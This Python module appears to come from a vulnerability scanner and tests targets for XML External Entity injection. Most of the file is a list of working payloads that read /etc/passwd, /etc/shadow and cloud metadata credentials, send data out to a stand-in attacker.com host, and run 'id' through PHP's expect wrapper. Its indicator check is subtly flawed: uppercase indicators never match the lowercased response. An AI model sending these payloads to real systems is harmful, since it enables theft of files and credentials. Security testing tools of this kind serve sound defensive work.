from .base import BaseScanner, Vulnerability
from ..core.target import Target
from typing import List
import logging

logger = logging.getLogger(__name__)

class XXEScanner(BaseScanner):
    """Scanner for XML External Entity (XXE) vulnerabilities"""
    
    XXE_PAYLOADS = [
        # Basic external entity - Linux files
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>""",
        
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<data>&xxe;</data>""",
        
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root>&xxe;</root>""",
        
        # Basic external entity - Windows files
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<data>&xxe;</data>""",
        
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
<data>&xxe;</data>""",
        
        # SSRF via XXE - AWS metadata
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>""",
        
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<data>&xxe;</data>""",
        
        # SSRF via XXE - GCP metadata
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>
<data>&xxe;</data>""",
        
        # Blind XXE - Out-of-band data exfiltration
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<data>test</data>""",
        
        # Parameter entity attack
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;]>
<data>&send;</data>""",
        
        # XInclude attack (when can't modify DOCTYPE)
        """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>""",
        
        """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///c:/windows/win.ini"/></foo>""",
        
        # UTF-7 encoded XXE
        """+ADw-?xml version=+ACI-1.0+ACI- encoding=+ACI-UTF-7+ACI-?+AD4-
+ADw-!DOCTYPE foo+AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-data+AD4-+ACY-xxe+ADs-+ADw-/data+AD4-""",
        
        # UTF-16 encoded XXE
        """<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>""",
        
        # SOAP XXE
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><foo>&xxe;</foo></soap:Body>
</soap:Envelope>""",
        
        # SVG XXE
        """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="500" height="100" xmlns="http://www.w3.org/2000/svg">
<text x="0" y="16">&xxe;</text>
</svg>""",
        
        # Advanced parameter entity
        """<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/hostname" >
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
]>""",
        
        # PHP expect wrapper (if enabled)
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<data>&xxe;</data>""",
        
        # FTP protocol handler
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com:21/file">]>
<data>&xxe;</data>""",
    ]
    
    INDICATORS = [
        "root:",
        "[extensions]",
        "ami-",
        "localhost",
        "bin/bash",
        "daemon:",
        "nobody:",
        "ssh:",
        "www-data:",
        "[boot loader]",
        "[operating systems]",
        "instance-id",
        "security-credentials",
        "127.0.0.1",
        "<!ENTITY",
        "<!DOCTYPE",
    ]
    
    def scan(self, target: Target, callback=None) -> List[Vulnerability]:
        """Scan target for XXE vulnerabilities"""
        vulnerabilities = []
        logger.info(f"Starting XXE scan on {target.url}")
        
        for payload in self.XXE_PAYLOADS:
            try:
                headers = {
                    'Content-Type': 'application/xml',
                    'Accept': 'application/xml'
                }
                
                response = self.session.post(
                    target.url,
                    data=payload,
                    headers=headers,
                    timeout=10
                )
                
                # Check for XXE indicators in response
                for indicator in self.INDICATORS:
                    if indicator in response.text.lower():
                        vuln = Vulnerability(
                            name="XML External Entity (XXE) Injection",
                            description="The application processes XML input without properly disabling external entity references, allowing disclosure of internal files or SSRF attacks.",
                            severity="HIGH",
                            evidence=f"Payload type: XXE, Indicator found: {indicator}, Response preview: {response.text[:200]}"
                        )
                        vulnerabilities.append(vuln)
                        logger.warning(f"XXE vulnerability found at {target.url}")
                        return vulnerabilities
                        
            except Exception as e:
                logger.debug(f"Error testing XXE payload: {str(e)}")
                continue
        
        return vulnerabilities
